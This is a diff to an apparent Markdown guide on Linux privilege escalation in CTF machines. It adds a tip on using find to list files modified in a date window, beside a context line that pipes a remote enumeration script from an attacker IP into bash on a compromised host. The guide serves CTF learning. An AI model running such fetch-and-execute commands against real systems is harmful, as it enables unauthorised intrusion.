@@ -285,6 +285,15 @@ www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash
 ```
 And the enumeration script should run on the remote machine.
 
+## CTF Machine Tactics
+
+Often it is easy to identify when a machine was created by the date / time of file edits.
+We can create a list of all the files with a modify time in that timeframe with the following command:
+```
+find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt
+```
+This has helped me to find interesting files on a few different CTF machines.
+
 ## References
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   
